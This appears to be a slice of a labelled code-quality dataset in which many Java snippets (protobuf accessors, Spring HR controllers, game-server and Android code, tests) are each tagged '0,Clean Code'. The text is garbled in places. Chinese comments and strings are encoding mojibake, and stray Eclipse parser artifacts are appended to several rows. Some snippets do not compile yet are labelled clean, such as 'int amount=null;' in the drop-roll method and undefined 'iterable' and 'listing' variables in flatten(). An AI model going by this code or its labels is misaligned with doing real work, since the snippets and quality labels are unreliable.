}
",0,Clean Code
"@Override public ChallengeInfo clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  storyInfo.clearQuick();
  return this;
}",0,Clean Code
"/** 
 * 鑾峰彇妯″潡鐨勯樁娈典换鍔�
 * @param moduleId
 * @param version
 * @return
 */
List<StageTask> getByModuleIdAndVersion(Long moduleId,Integer version);
",0,Clean Code
"@PostMapping(""/addEmployee"") @ApiOperation(""鏂板缓鍛樺伐"") @OperateLog(apply=ApplyEnum.HRM,object=OperateObjectEnum.HRM_EMPLOYEE,behavior=BehaviorEnum.SAVE) public Result addEmployee(@Valid @RequestBody AddEmployeeBO employeeVO){
  List<OperationLog> operationLogList=employeeService.add(employeeVO);
  return OperationResult.ok(operationLogList);
}
@PostMapping(""/addEmployeeField"") @ApiOperation(""鏂板缓鑷畾涔夊瓧娈靛憳宸�"") @OperateLog(apply=ApplyEnum.HRM,object=OperateObjectEnum.HRM_EMPLOYEE,behavior=BehaviorEnum.SAVE) public Result addEmployee(@RequestBody AddEmployeeFieldManageBO addEmployeeFieldManageBO){
  List<OperationLog> operationLogList=employeeService.addEmployeeField(addEmployeeFieldManageBO);
  return OperationResult.ok(operationLogList);
}
",0,Clean Code
"public String getJoinGuildSig(){
  return this.mInfo.getJoinGuildSig();
}
",0,Clean Code
"/** 
 * <code>optional bool ACEOIOACIJO = 11;</code>
 * @return the aCEOIOACIJO
 */
public boolean getACEOIOACIJO(){
  return aCEOIOACIJO;
}",0,Clean Code
"/** 
 * Changes the player's current active avatar
 * @param slot The slot of the avatar we are changing to
 * @return true on success
 */
public boolean changeLeader(int slot){
  PlayerLineup lineup=this.getCurrentLineup();
  if (slot >= 0 && slot < lineup.size()) {
    lineup.setLeader(slot);
    return true;
  }
  return false;
}",0,Clean Code
"public RawCall getMatchedCall(){
  return matchedPartnerCall;
}
",0,Clean Code
"public void write(MemoryBuffer buffer,OffsetDateTime obj){
  LocalDateSerializer.writeLocalDate(buffer,obj.toLocalDate());
  LocalTimeSerializer.writeLocalTime(buffer,obj.toLocalTime());
  ZoneOffsetSerializer.writeZoneOffset(buffer,obj.getOffset());
}
",0,Clean Code
"public static int getPollutedPosition(TabbyVariable var){
  if (var != null) {
    String related=null;
    if (var.isPolluted()) {
      related=var.getValue().getRelatedType();
      if (related == null) {
        for (        TabbyVariable element : var.getElements().values()) {
          if (element != null && element.isPolluted()) {
            related=element.getValue().getRelatedType();
            break;
          }
        }
      }
      if (related == null) {
        for (        TabbyVariable field : var.getFieldMap().values()) {
          if (field != null && field.isPolluted()) {
            related=field.getValue().getRelatedType();
            break;
          }
        }
      }
    }
 else     if (var.containsPollutedVar(new ArrayList<>())) {
      related=var.getFirstPollutedVarRelatedType();
    }
    if (related != null) {
      return PositionUtils.getPosition(related);
    }
  }
  return PositionUtils.NOT_POLLUTED_POSITION;
}
",0,Clean Code
"void onWindowSizeChanged(int size);
private void onWindowSizeChanged(){
  int size=sizeNotifierLayout.getHeight();
  if (!keyboardVisible) {
    size-=emojiPadding;
  }
  if (delegate != null) {
    delegate.onWindowSizeChanged(size);
  }
  if (topView != null) {
    if (size < AndroidUtilities.dp(72) + ActionBar.getCurrentActionBarHeight()) {
      if (allowShowTopView) {
        allowShowTopView=false;
        if (needShowTopView) {
          topView.setVisibility(GONE);
          topLineView.setVisibility(GONE);
          topLineView.setAlpha(0.0f);
          resizeForTopView(false);
          topViewEnterProgress=0f;
          topView.setTranslationY(topView.getLayoutParams().height);
        }
      }
    }
 else {
      if (!allowShowTopView) {
        allowShowTopView=true;
        if (needShowTopView) {
          topView.setVisibility(VISIBLE);
          topLineView.setVisibility(VISIBLE);
          topLineView.setAlpha(1.0f);
          resizeForTopView(true);
          topViewEnterProgress=1f;
          topView.setTranslationY(0);
        }
      }
    }
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 buff_id = 12;</code>
 * @return the buffId
 */
public int getBuffId(){
  return buffId;
}",0,Clean Code
"@PostMapping(""/delete/{attendanceGroupId}"") @ApiOperation(""鍒犻櫎鑰冨嫟缁�"") @OperateLog(apply=ApplyEnum.HUMAN_RESOURCE_MANAGEMENT,type=OperateTypeEnum.SETTING,behavior=BehaviorEnum.DELETE,object=OperateObjectEnum.HUMAN_ATTENDANCE_RULE_SETTING) public Result deleteAttendanceGroup(@PathVariable(""attendanceGroupId"") Long attendanceGroupId){
  OperationLog operationLog=attendanceGroupService.deleteAttendanceGroup(attendanceGroupId);
  return OperationResult.ok(operationLog);
}
",0,Clean Code
"@Test public void stringResultShouldBeCorrectlyExtracted(){
  final JsonJqTransform jsonJqTransform=new JsonJqTransform(objectMapper);
  final WorkflowModel workflow=new WorkflowModel();
  final TaskModel task=new TaskModel();
  final Map<String,Object> taskInput=new HashMap<>();
  taskInput.put(""data"",new ArrayList<>());
  taskInput.put(""queryExpression"",""if(.data | length >0) then \""EXISTS\"" else \""CREATE\"" end"");
  task.setInputData(taskInput);
  jsonJqTransform.start(workflow,task,null);
  assertNull(task.getOutputData().get(""error""));
  assertTrue(task.getOutputData().get(""result"") instanceof String);
  String result=(String)task.getOutputData().get(""result"");
  assertEquals(""CREATE"",result);
}",0,Clean Code
"/** 
 * <code>optional uint32 roll_shop_id = 15;</code>
 * @return the rollShopId
 */
public int getRollShopId(){
  return rollShopId;
}",0,Clean Code
"/** 
 * <code>repeated .RelicAffix sub_affix_list = 4;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableSubAffixList()} if you want to modify it.
 * @return internal storage object for reading
 */
public RepeatedMessage<RelicAffixOuterClass.RelicAffix> getSubAffixList(){
  return subAffixList;
}",0,Clean Code
"/** 
 * <code>optional uint32 prop_id = 4;</code>
 * @return the propId
 */
public int getPropId(){
  return propId;
}",0,Clean Code
"@Override public int getId(){
  return (GroupID << 16) + StarCount;
}",0,Clean Code
"/** 
 * <code>repeated .Shop shop_list = 8;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<ShopOuterClass.Shop> getMutableShopList(){
  bitField0_|=0x00000004;
  return shopList;
}",0,Clean Code
"@Override public String getSessionId(){
  return null;
}
",0,Clean Code
"@Test public void testZrevrangeByLex(){
  jedisCluster.zrevrangeByLex(""key"",""max"",""min"");
  jedisCluster.zrevrangeByLex(""key"",""max"",""min"",1337,1338);
}",0,Clean Code
"@Override public RelicArchive mergeFrom(final RelicArchive other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasRelicId()) {
    setRelicId(other.relicId);
  }
  if (other.hasSlot()) {
    setSlot(other.slot);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@762201ef!org.eclipse.jdt.core.dom.MethodDeclaration@152fd45",0,Clean Code
"public Integer getDimensions(){
  return this.dimensions;
}
",0,Clean Code
"@PostMapping(""/adminAddEmployee"") @ApiOperation(""浠庣郴缁熺敤鎴锋坊鍔犲憳宸�"") @OperateLog(apply=ApplyEnum.HRM,object=OperateObjectEnum.HRM_EMPLOYEE,behavior=BehaviorEnum.SAVE) public Result adminAddEmployee(@RequestBody List<AddEmployeeBO> employeeList){
  List<OperationLog> operationLogs=employeeService.adminAddEmployee(employeeList);
  return OperationResult.ok(operationLogs);
}
",0,Clean Code
"/** 
 * <code>repeated uint32 text_join_id_list = 3;</code>
 * @param value the textJoinIdList to add
 * @return this
 */
public TextJoinQueryCsReq addTextJoinIdList(final int value){
  bitField0_|=0x00000001;
  textJoinIdList.add(value);
  return this;
}",0,Clean Code
"public int getSizeOfUnmatchedFunctions(final ESide side){
  return metadata.getSizeOfUnmatchedFunctions(side);
}
",0,Clean Code
"@Override public List<HrmEmployee> queryBecomeEmpListByTime(LocalDate time,Collection<Long> employeeIds){
  return employeeMapper.queryBecomeEmpListByTime(time,employeeIds);
}
",0,Clean Code
"MockLVQPackedVectors(LocallyAdaptiveVectorQuantization lvq,List<VectorFloat<?>> vectors,Path testDirectory) throws IOException {
  var ravv=new ListRandomAccessVectorValues(vectors,lvq.globalMean.length());
  var encodedVectors=lvq.encodeAll(ravv);
  var lvqPath=testDirectory.resolve(""lvq"" + System.nanoTime());
  try (var out=TestUtil.openDataOutputStream(lvqPath)){
    for (    var encodedVector : encodedVectors) {
      encodedVector.writePacked(out);
    }
  }
   var dimension=lvq.globalMean.length();
  this.reader=new SimpleMappedReader(lvqPath);
  this.encodedVectorSize=2 * Float.BYTES + ((dimension % 64 == 0) ? dimension : ((dimension / 64 + 1) * 64));
  this.packedVector=vectorTypeSupport.createByteSequence(encodedVectorSize - 2 * Float.BYTES);
}",0,Clean Code
"@TruffleBoundary public final VmCollection flatten(){
  var builder=builder();
  for (  var elem : this) {
    if (elem instanceof Iterable<?>) {
      builder.addAll(iterable);
    }
 else     if (elem instanceof VmListing) {
      listing.forceAndIterateMemberValues((key,member,value) -> {
        builder.add(value);
        return true;
      }
);
    }
 else {
      CompilerDirectives.transferToInterpreter();
      throw new VmExceptionBuilder().evalError(""cannotFlattenCollectionWithNonCollectionElement"").withProgramValue(""Element"",elem).build();
    }
  }
  return builder.build();
}
",0,Clean Code
"@Override public void actionPerformed(final ActionEvent unused){
  dialog.setVisible(false);
  dialog.dispose();
}
",0,Clean Code
"public Builder withIndex(String index){
  Assert.hasText(index,""index must have a value"");
  this.index=index;
  return this;
}
",0,Clean Code
"public void removeListener(){
  graph.getView().getCanvasComponent().removeMouseListener(this);
}
",0,Clean Code
"public static void throwBy(boolean expression,String code,String msg){
  if (expression) {
    if (StrUtil.isBlank(msg)) {
      msg="""";
    }
    throw new XzException(code,msg);
  }
}
",0,Clean Code
"/** 
 * collector use - to get the next set of priority metric group tasks
 * @param metrics Current Metrics
 * @param first   Is it the first time to get
 * @return Metrics TasksReturning null means: the job has been completed, and the collection of all metrics has ended Returning the empty set metrics that there are still metrics collection tasks at the current level that have not been completed,and the next level metrics task collection cannot be performed. The set returned empty means that there are still indicator collection tasks unfinished at the current level, and the task collection at the next level cannot be carried out Returns a set of data representation: get the next set of priority index collcet tasks
 */
public synchronized Set<Metrics> getNextCollectMetrics(Metrics metrics,boolean first){
  if (priorMetrics == null || priorMetrics.isEmpty()) {
    return null;
  }
  Set<Metrics> metricsSet=priorMetrics.peek();
  if (first) {
    if (metricsSet.isEmpty()) {
      log.error(""metrics must has one [availability] metrics at least."");
    }
    return metricsSet;
  }
  if (metrics == null) {
    log.error(""metrics can not null when not first get"");
    return null;
  }
  if (!metricsSet.remove(metrics)) {
    log.warn(""Job {} appId {} app {} metrics {} remove empty error in priorMetrics."",id,monitorId,app,metrics.getName());
  }
  if (metricsSet.isEmpty()) {
    priorMetrics.poll();
    if (priorMetrics.isEmpty()) {
      return null;
    }
    Set<Metrics> source=priorMetrics.peek();
    return new HashSet<>(source);
  }
 else {
    return Collections.emptySet();
  }
}
",0,Clean Code
"public static String getUser(HttpServletRequest request){
  if (request == null) {
    return null;
  }
  return getUser(request.getHeader(API_ACCESS_KEY),request.getHeader(API_SIGNATURE));
}
public static String getUser(String accessKey,String signature){
  if (StringUtils.isBlank(accessKey) || StringUtils.isBlank(signature)) {
    return null;
  }
  UserKey userKey=CommonBeanFactory.getBean(UserKeyService.class).getUserKey(accessKey);
  if (userKey == null) {
    throw new RuntimeException(""invalid accessKey"");
  }
  if (BooleanUtils.isFalse(userKey.getEnable())) {
    throw new RuntimeException(""accessKey is disabled"");
  }
  if (BooleanUtils.isFalse(userKey.getForever())) {
    if (userKey.getExpireTime() == null || userKey.getExpireTime() < System.currentTimeMillis()) {
      throw new RuntimeException(""accessKey is expired"");
    }
  }
  String signatureDecrypt;
  try {
    signatureDecrypt=CodingUtils.aesDecrypt(signature,userKey.getSecretKey(),accessKey);
  }
 catch (  Throwable t) {
    throw new RuntimeException(""invalid signature"");
  }
  String[] signatureArray=StringUtils.split(StringUtils.trimToNull(signatureDecrypt),""|"");
  if (signatureArray.length < 2) {
    throw new RuntimeException(""invalid signature"");
  }
  if (!StringUtils.equals(accessKey,signatureArray[0])) {
    throw new RuntimeException(""invalid signature"");
  }
  long signatureTime;
  try {
    signatureTime=Long.parseLong(signatureArray[signatureArray.length - 1]);
  }
 catch (  Exception e) {
    throw new RuntimeException(e);
  }
  if (Math.abs(System.currentTimeMillis() - signatureTime) > 1800000) {
    throw new RuntimeException(""expired signature"");
  }
  return userKey.getCreateUser();
}",0,Clean Code
"@Override protected String getValueName(BlockEntityType<?> value){
  String name=""Unknown"";
  if (value == BlockEntityType.FURNACE)   name=""Furnace"";
 else   if (value == BlockEntityType.CHEST)   name=""Chest"";
 else   if (value == BlockEntityType.TRAPPED_CHEST)   name=""Trapped Chest"";
 else   if (value == BlockEntityType.ENDER_CHEST)   name=""Ender Chest"";
 else   if (value == BlockEntityType.DISPENSER)   name=""Dispenser"";
 else   if (value == BlockEntityType.DROPPER)   name=""Dropper"";
 else   if (value == BlockEntityType.HOPPER)   name=""Hopper"";
 else   if (value == BlockEntityType.SHULKER_BOX)   name=""Shulker Box"";
 else   if (value == BlockEntityType.BARREL)   name=""Barrel"";
 else   if (value == BlockEntityType.SMOKER)   name=""Smoker"";
 else   if (value == BlockEntityType.BLAST_FURNACE)   name=""Blast Furnace"";
  return name;
}
",0,Clean Code
"@Override public void addInterceptors(InterceptorRegistry registry){
  registry.addInterceptor(userTypeInterceptor()).addPathPatterns(""/**"").excludePathPatterns(""/blog/**"",""/editor/**"",""/error"");
}
",0,Clean Code
"public static String computeCompanyAge(Integer companyAge){
  if (companyAge <= 0) {
    return """";
  }
  int year=companyAge / 365;
  int month=(companyAge % 365) / 30;
  int day=(companyAge % 365) % 30;
  StringBuilder sb=new StringBuilder();
  if (year != 0) {
    sb.append(year).append(""骞�"");
  }
  if (month != 0) {
    sb.append(month).append(""鏈�"");
  }
  if (day != 0) {
    sb.append(day).append(""澶�"");
  }
  return sb.toString();
}",0,Clean Code
"@Override public String toString(){
  return ""MetaStringBytes{"" + ""hashCode="" + hashCode + "", size=""+ bytes.length+ "", bytes=""+ Arrays.toString(bytes)+ '}';
}
",0,Clean Code
"/** 
 * @param method the method to set
 */
public void setMethod(String method){
  this.method=method;
}
",0,Clean Code
"/** 
 * <code>optional string text = 15;</code>
 * @return the text
 */
public String getText(){
  return text.getString();
}",0,Clean Code
"@Override public String toString(){
  return ""DeleteRecruitChannelBO{"" + ""deleteChannelId="" + deleteChannelId + "", changeChannelId=""+ changeChannelId+ '}';
}
",0,Clean Code
"/** 
 * 鎵归噺鍒犻櫎鏂囦欢
 * @param keys key鍒楄〃
 */
public void deleteFileBatch(List<String> keys);
/** 
 * 鎵归噺鍒犻櫎鏂囦欢
 * @param keys       key鍒楄〃
 * @param bucketName 妗跺悕绉�
 */
public void deleteFileBatch(List<String> keys,String bucketName);
",0,Clean Code
"public EVisibilityFilter getVisibilityFilter(){
  if (visibilityCombo.getValue().equals(FILTER_ITEM_VISIBLE)) {
    return EVisibilityFilter.VISIBLE;
  }
 else   if (visibilityCombo.getValue().equals(FILTER_ITEM_INVISIBLE)) {
    return EVisibilityFilter.INVISIBLE;
  }
  return EVisibilityFilter.NONE;
}
",0,Clean Code
"@Test @DisplayName(""it should honor the polling interval from annotations and config"") void threadCountTest() throws NoSuchMethodException {
  var config=new TestWorkerConfig();
  var worker=new MultipleInputParams();
  var worker2=new AnotherAnnotationInput();
  AnnotatedWorkerExecutor annotatedWorkerExecutor=new AnnotatedWorkerExecutor(mock(TaskClient.class),config);
  annotatedWorkerExecutor.addBean(worker);
  annotatedWorkerExecutor.addBean(worker2);
  annotatedWorkerExecutor.startPolling();
  TaskRunnerConfigurer runner=annotatedWorkerExecutor.getTaskRunner();
  assertNotNull(runner);
  Map<String,Integer> taskThreadCount=runner.getTaskThreadCount();
  assertNotNull(taskThreadCount);
  assertEquals(3,taskThreadCount.get(""test_1""));
  assertEquals(1,taskThreadCount.get(""test_2""));
  annotatedWorkerExecutor.shutdown();
  config.setThreadCount(""test_2"",2);
  annotatedWorkerExecutor=new AnnotatedWorkerExecutor(mock(TaskClient.class),config);
  annotatedWorkerExecutor.addBean(worker);
  annotatedWorkerExecutor.addBean(worker2);
  annotatedWorkerExecutor.startPolling();
  runner=annotatedWorkerExecutor.getTaskRunner();
  taskThreadCount=runner.getTaskThreadCount();
  assertNotNull(taskThreadCount);
  assertEquals(3,taskThreadCount.get(""test_1""));
  assertEquals(2,taskThreadCount.get(""test_2""));
}",0,Clean Code
"@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (obj == null)   return false;
  if (getClass() != obj.getClass())   return false;
  VertexAiGeminiChatOptions other=(VertexAiGeminiChatOptions)obj;
  if (stopSequences == null) {
    if (other.stopSequences != null)     return false;
  }
 else   if (!stopSequences.equals(other.stopSequences))   return false;
  if (temperature == null) {
    if (other.temperature != null)     return false;
  }
 else   if (!temperature.equals(other.temperature))   return false;
  if (topP == null) {
    if (other.topP != null)     return false;
  }
 else   if (!topP.equals(other.topP))   return false;
  if (topK == null) {
    if (other.topK != null)     return false;
  }
 else   if (!topK.equals(other.topK))   return false;
  if (candidateCount == null) {
    if (other.candidateCount != null)     return false;
  }
 else   if (!candidateCount.equals(other.candidateCount))   return false;
  if (maxOutputTokens == null) {
    if (other.maxOutputTokens != null)     return false;
  }
 else   if (!maxOutputTokens.equals(other.maxOutputTokens))   return false;
  if (model == null) {
    if (other.model != null)     return false;
  }
 else   if (!model.equals(other.model))   return false;
  if (functionCallbacks == null) {
    if (other.functionCallbacks != null)     return false;
  }
 else   if (!functionCallbacks.equals(other.functionCallbacks))   return false;
  if (functions == null) {
    if (other.functions != null)     return false;
  }
 else   if (!functions.equals(other.functions))   return false;
  return true;
}
",0,Clean Code
"public static void normalizeFlags(TLRPC.Message message){
  if (message.from_id == null) {
    message.flags&=~256;
  }
  if (message.from_id == null) {
    message.flags&=~4;
  }
  if (message.reply_to == null) {
    message.flags&=~8;
  }
  if (message.media == null) {
    message.flags&=~512;
  }
  if (message.reply_markup == null) {
    message.flags&=~64;
  }
  if (message.replies == null) {
    message.flags&=~8388608;
  }
  if (message.reactions == null) {
    message.flags&=~1048576;
  }
}",0,Clean Code
"/** 
 * @param mouseButton one of the MOUSE_* constants of this class.
 */
public void sendMouseEvent(int mouseButton,int column,int row,boolean pressed){
  if (column < 1)   column=1;
  if (column > mColumns)   column=mColumns;
  if (row < 1)   row=1;
  if (row > mRows)   row=mRows;
  if (mouseButton == MOUSE_LEFT_BUTTON_MOVED && !isDecsetInternalBitSet(DECSET_BIT_MOUSE_TRACKING_BUTTON_EVENT)) {
  }
 else   if (isDecsetInternalBitSet(DECSET_BIT_MOUSE_PROTOCOL_SGR)) {
    mSession.write(String.format(""\033[<%d;%d;%d"" + (pressed ? 'M' : 'm'),mouseButton,column,row));
  }
 else {
    mouseButton=pressed ? mouseButton : 3;
    boolean out_of_bounds=column > 255 - 32 || row > 255 - 32;
    if (!out_of_bounds) {
      byte[] data={'\033','[','M',(byte)(32 + mouseButton),(byte)(32 + column),(byte)(32 + row)};
      mSession.write(data,0,data.length);
    }
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 MMFONFFPNJM = 8;</code>
 * @return this
 */
public RogueMiracleDataInfo clearMMFONFFPNJM(){
  bitField0_&=~0x00000002;
  mMFONFFPNJM=0;
  return this;
}",0,Clean Code
"public String getXmlContent(){
  return this.xmlContent;
}
",0,Clean Code
"@Override public void onTearDown(){
  if (isTornDown()) {
    return;
  }
  if (mPlaceholderListener != null) {
    mPlaceholderListener.invalidate();
  }
  if (mMainListener != null) {
    mMainListener.invalidate();
  }
  super.onTearDown();
  if (mNativeQuad != null) {
    mNativeQuad.dispose();
    mNativeQuad=null;
  }
  if (mDefaultMaterial != null) {
    mDefaultMaterial.dispose();
    mDefaultMaterial=null;
  }
  if (mLatestImage != null) {
    mLatestImage.destroy();
    mLatestImage=null;
  }
  if (mLatestImageTexture != null) {
    mLatestImageTexture.dispose();
    mLatestImageTexture=null;
  }
}
",0,Clean Code
"public static void extractRootfs(Context context,boolean romExist,boolean needsUpgrade,boolean forceInstall,boolean use3rdRom){
  removeSystemPartition(context);
  removeVendorPartition(context);
  if (!romExist) {
    extractRootfsInAssets(context);
    return;
  }
  if (forceInstall) {
    if (use3rdRom) {
      boolean success=extract3rdRootfs(context);
      if (!success) {
        showRootfsInstallationFailure(context);
        return;
      }
    }
 else {
      if (!extractRootfsInAssets(context)) {
        showRootfsInstallationFailure(context);
        return;
      }
    }
    AppKV.setBooleanConfig(context,AppKV.FORCE_ROM_BE_RE_INSTALL,false);
  }
 else {
    if (use3rdRom) {
      Log.w(TAG,""WTF? 3rd ROM must be force install!"");
    }
    if (needsUpgrade) {
      Log.i(TAG,""upgrade factory rom.."");
      if (!extractRootfsInAssets(context)) {
        showRootfsInstallationFailure(context);
      }
    }
  }
}
public static int extractRootfs(Context context,File rootfs7z){
  int cpu=Runtime.getRuntime().availableProcessors();
  return P7ZipApi.executeCommand(String.format(Locale.US,""7z x -mmt=%d -aoa '%s' '-o%s'"",cpu,rootfs7z,context.getDataDir()));
}",0,Clean Code
"public Float getRepetitionPenalty(){
  return repetitionPenalty;
}
",0,Clean Code
"public String getEventName(){
  return bundle.getString(""EVENT_NAME"");
}
!org.eclipse.jdt.core.dom.MethodDeclaration@4ec7bd88",0,Clean Code
"void changedY(CBend bend,double y);
",0,Clean Code
"private static void home(){
  String s=AntStallRpcCall.home();
  try {
    JSONObject jo=new JSONObject(s);
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      if (!jo.getBoolean(""hasRegister"") || jo.getBoolean(""hasQuit"")) {
        Log.farm(""铓傝殎鏂版潙鉀鍏堝紑鍚殏铓佹柊鏉�"");
        return;
      }
      JSONObject astReceivableCoinVO=jo.getJSONObject(""astReceivableCoinVO"");
      if (astReceivableCoinVO.optBoolean(""hasCoin"")) {
        settleReceivable();
      }
      if (Config.stallThrowManure()) {
        throwManure();
      }
      JSONObject seatsMap=jo.getJSONObject(""seatsMap"");
      settle(seatsMap);
      collectManure();
      sendBack(seatsMap);
      if (Config.stallAutoClose()) {
        closeShop();
      }
      if (Config.stallAutoOpen()) {
        openShop();
      }
      taskList();
      achieveBeShareP2P();
      if (Config.stallDonate()) {
        roadmap();
      }
    }
 else {
      Log.recordLog(""home err:"",s);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""home err:"");
    Log.printStackTrace(TAG,t);
  }
}",0,Clean Code
"/** 
 * Returns an array of the property names on the given script object.
 */
private Object[] getObjectIdsImpl(Context cx,Object object){
  if (!(object instanceof Scriptable) || object == Undefined.instance) {
    return Context.emptyArgs;
  }
  Object[] ids;
  Scriptable scriptable=(Scriptable)object;
  if (scriptable instanceof DebuggableObject) {
    ids=((DebuggableObject)scriptable).getAllIds();
  }
 else {
    ids=scriptable.getIds();
  }
  Scriptable proto=scriptable.getPrototype();
  Scriptable parent=scriptable.getParentScope();
  int extra=0;
  if (proto != null) {
    ++extra;
  }
  if (parent != null) {
    ++extra;
  }
  if (extra != 0) {
    Object[] tmp=new Object[extra + ids.length];
    System.arraycopy(ids,0,tmp,extra,ids.length);
    ids=tmp;
    extra=0;
    if (proto != null) {
      ids[extra++]=""__proto__"";
    }
    if (parent != null) {
      ids[extra++]=""__parent__"";
    }
  }
  return ids;
}",0,Clean Code
"@Override public void removedBend(final CViewEdge<?> edge,final int index,final CBend bend){
  bend.removeListener(m_listener);
  if (m_realizer.bendCount() == m_rawEdge.getBendCount()) {
    return;
  }
  m_realizer.removeBend(m_realizer.getBend(index));
}
@Override public void removedBend(final ZyEdgeRealizer<EdgeTypeT> realizer,final int position){
  m_rawEdge.removeBend(position);
}
",0,Clean Code
"private KNNModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private KNNModelProto(){
  vectors_=java.util.Collections.emptyList();
  outputs_=java.util.Collections.emptyList();
  parallelBackend_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@496819a6",0,Clean Code
"public void roll(ItemParamMap drops){
  if (this.chance < 1000) {
    int random=Utils.randomRange(0,999);
    if (random > this.chance) {
      return;
    }
  }
  var count=BigDecimal.valueOf(generateCount());
  var rates=LunarCore.getConfig().getServerRates();
  while (count.doubleValue() > 0) {
    int itemId=generateItemId();
    ItemExcel excel=GameData.getItemExcelMap().get(itemId);
    if (excel == null)     break;
    if (excel.isEquippable()) {
      if (rates.getEquip() > 0) {
        drops.addTo(itemId,1);
        count=count.subtract(BigDecimal.valueOf(1.0 / rates.getEquip()));
      }
 else {
        count=count.subtract(BigDecimal.ONE);
      }
    }
 else {
      int amount=null;
      if (amount > 0) {
        drops.addTo(itemId,amount);
      }
      count=BigDecimal.ZERO;
    }
  }
}",0,Clean Code
"@Override public SetFriendMarkScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  uid=0;
  retcode=0;
  isSetMark=false;
  return this;
}",0,Clean Code
"@TruffleBoundary private UnmodifiableEconomicSet<Object> collectAllRegularPropertyNames(){
  if (EconomicMaps.isEmpty(declaredProperties)) {
    return superclass == null ? EconomicSet.create() : superclass.getAllRegularPropertyNames();
  }
  var size=superclass == null ? 0 : superclass.getAllRegularPropertyNames().size();
  var result=EconomicSet.create(size);
  for (  var property : EconomicMaps.getValues(declaredProperties)) {
    if (!(property.isLocal() || isHiddenProperty(property.getName()) || property.isExternal())) {
      result.add(property.getName());
    }
  }
  if (superclass == null) {
    return result;
  }
  if (result.isEmpty()) {
    return superclass.getAllRegularPropertyNames();
  }
  result.addAll(superclass.getAllRegularPropertyNames());
  return result;
}",0,Clean Code
"/** 
 * Returns the set of permissions corresponding to a given  {@code String}representation. <p> The  {@code perms} parameter is a {@code String} representing thepermissions. It has 9 characters that are interpreted as three sets of three. The first set refers to the owner's permissions; the next to the group permissions and the last to others. Within each set, the first character is  {@code 'r'} to indicate permission to read, the secondcharacter is  {@code 'w'} to indicate permission to write, and the thirdcharacter is  {@code 'x'} for execute permission. Where a permission isnot set then the corresponding character is set to  {@code '-'}. <p> <b>Usage Example:</b> Suppose we require the set of permissions that indicate the owner has read, write, and execute permissions, the group has read and execute permissions and others have none. <pre> Set&lt;FilePermission&gt; perms = FilePermissions.fromString(""rwxr-x---""); </pre>
 * @param perms string representing a set of permissions
 * @return  the resulting set of permissions
 * @throws IllegalArgumentException if the string cannot be converted to a set of permissions
 * @see #toString(Set)
 */
public static Set<FilePermission> fromString(String perms){
  if (perms.length() != 9)   throw new IllegalArgumentException(""Invalid mode"");
  Set<FilePermission> result=EnumSet.noneOf(FilePermission.class);
  if (isR(perms.charAt(0)))   result.add(OWNER_READ);
  if (isW(perms.charAt(1)))   result.add(OWNER_WRITE);
  if (isX(perms.charAt(2)))   result.add(OWNER_EXECUTE);
  if (isR(perms.charAt(3)))   result.add(GROUP_READ);
  if (isW(perms.charAt(4)))   result.add(GROUP_WRITE);
  if (isX(perms.charAt(5)))   result.add(GROUP_EXECUTE);
  if (isR(perms.charAt(6)))   result.add(OTHERS_READ);
  if (isW(perms.charAt(7)))   result.add(OTHERS_WRITE);
  if (isX(perms.charAt(8)))   result.add(OTHERS_EXECUTE);
  return result;
}",0,Clean Code
"/** 
 * <code>optional uint32 relic_unique_id = 10;</code>
 * @return the relicUniqueId
 */
public int getRelicUniqueId(){
  return relicUniqueId;
}",0,Clean Code
"private List<? extends KeyReference> createKey(Object[] keys){
  boolean[] reclaimedFlags=new boolean[keys.length];
  if (GraalvmSupport.isGraalBuildtime()) {
    List<NoCallbackRef> keyRefs=new ArrayList<>();
    for (    Object key : keys) {
      keyRefs.add(new NoCallbackRef(key));
    }
    return keyRefs;
  }
  List<FinalizableKeyReference> keyRefs=new ArrayList<>();
  for (int i=0; i < keys.length; i++) {
    keyRefs.add(new FinalizableKeyReference(keys[i],keyRefs,reclaimedFlags,i));
  }
  return keyRefs;
}",0,Clean Code
"@Override public void mouseReleased(final MouseEvent event){
  if (event.isPopupTrigger()) {
    showPopupMenu(event);
  }
}
",0,Clean Code
"private EvaluatorBuilder(){
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)24);
    output.writeUInt32NoTag(equipmentUniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)32);
    output.writeUInt32NoTag(baseAvatarId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)80);
    output.writeUInt32NoTag(equipAvatarId);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.equipmentUniqueId,equipmentUniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.baseAvatarId,baseAvatarId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeUInt32(FieldNames.equipAvatarId,equipAvatarId);
  }
  output.endObject();
}",0,Clean Code
"public ZhipuChatHeaderAuthorizationInterceptor(String key,String secret){
  this.key=key;
  this.secret=secret;
}
",0,Clean Code
"@Override public void handleLoadPackage(){
  initHook(UseThirdPartyBrowser.INSTANCE,mPrefsMap.getBoolean(""content_extension_browser""));
  initHook(new DisableChatWatermark(),mPrefsMap.getBoolean(""voiceassist_disable_watermark""));
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code GetGachaInfoScRsp}
 */
public static GetGachaInfoScRsp newInstance(){
  return new GetGachaInfoScRsp();
}
",0,Clean Code
"private void openItem(CacheModel.FileInfo fileInfo,CacheCell cacheCell){
